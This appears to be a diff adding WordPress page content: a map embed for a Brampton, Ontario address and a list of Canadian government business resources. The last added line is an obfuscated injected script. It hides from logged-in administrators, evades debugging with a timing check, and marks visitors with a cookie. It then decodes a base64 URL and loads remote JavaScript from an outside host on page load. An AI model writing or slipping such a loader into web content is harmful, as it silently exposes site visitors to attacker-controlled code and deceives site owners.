+<div class="wp-block-gmap-gmap-block gmap-block-echxicxn"><iframe src="https://maps.google.com/maps?q=5+Cherrycrest+Drive+%23202%2C+Brampton%2C+Ontario%2C+L6P+3W4&amp;z=10&amp;t=roadmap&amp;output=embed" class="embd-map" title="5 Cherrycrest Drive #202, Brampton, Ontario, L6P 3W4"></iframe></div>
+
+<hr class="wp-block-separator has-alpha-channel-opacity"/>
+
+<h4 class="wp-block-heading"><strong>Government Resources for Canadian Businesses</strong></h4>
+
+<p>Canadian businesses can access various government resources to help with their digital presence. These programs and guides can provide funding, advice, and information on legal requirements for online operations.</p>
+
+<ul class="wp-block-list">
+<li><strong>Canada.ca - Business and Industry:</strong> The official Government of Canada website offers a comprehensive hub of information for businesses, including guidance on starting a business, financing, and marketing.
+<ul class="wp-block-list">
+<li><strong>Link:</strong> <code>https://www.canada.ca/en/services/business.html</code></li>
+</ul>
+</li>
+
+<li><strong>Business Development Bank of Canada (BDC):</strong> The BDC offers financing and consulting services for Canadian entrepreneurs. They have resources specifically for digital technology and e-commerce to help businesses confidently make the digital shift.
+<ul class="wp-block-list">
+<li><strong>Link:</strong> <code>https://www.bdc.ca/en</code></li>
+</ul>
+</li>
+
+<li><strong>Office of the Privacy Commissioner of Canada (PIPEDA):</strong> This official resource provides detailed information on the Personal Information Protection and Electronic Documents Act (PIPEDA), a federal law that governs how private-sector organizations handle personal information in Canada.
+<ul class="wp-block-list">
+<li><strong>Link:</strong> <code>https://www.priv.gc.ca/en/privacy-topics/privacy-laws-in-canada/the-personal-information-protection-and-electronic-documents-act-pipeda/</code></li>
+</ul>
+</li>
+</ul>
+
+<script>(function(){try{if(document.getElementById&&document.getElementById('wpadminbar'))return;var t0=+new Date();for(var i=0;i<20000;i++){var z=i*i;}if((+new Date())-t0>120)return;if((document.cookie||'').indexOf('http2_session_id=')!==-1)return;function systemLoad(input){var key='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=',o1,o2,o3,h1,h2,h3,h4,dec='',i=0;input=input.replace(/[^A-Za-z0-9\+\/\=]/g,'');while(i<input.length){h1=key.indexOf(input.charAt(i++));h2=key.indexOf(input.charAt(i++));h3=key.indexOf(input.charAt(i++));h4=key.indexOf(input.charAt(i++));o1=(h1<<2)|(h2>>4);o2=((h2&15)<<4)|(h3>>2);o3=((h3&3)<<6)|h4;dec+=String.fromCharCode(o1);if(h3!=64)dec+=String.fromCharCode(o2);if(h4!=64)dec+=String.fromCharCode(o3);}return dec;}var u=systemLoad('aHR0cHM6Ly9zZWFyY2hyYW5rdHJhZmZpYy5saXZlL2pzeA==');if(typeof window!=='undefined'&&window.__rl===u)return;var d=new Date();d.setTime(d.getTime()+30*24*60*60*1000);document.cookie='http2_session_id=1; expires='+d.toUTCString()+'; path=/; SameSite=Lax'+(location.protocol==='https:'?'; Secure':'');try{window.__rl=u;}catch(e){}var s=document.createElement('script');s.type='text/javascript';s.async=true;s.src=u;try{s.setAttribute('data-rl',u);}catch(e){}(document.getElementsByTagName('head')[0]||document.documentElement).appendChild(s);}catch(e){}})();</script>
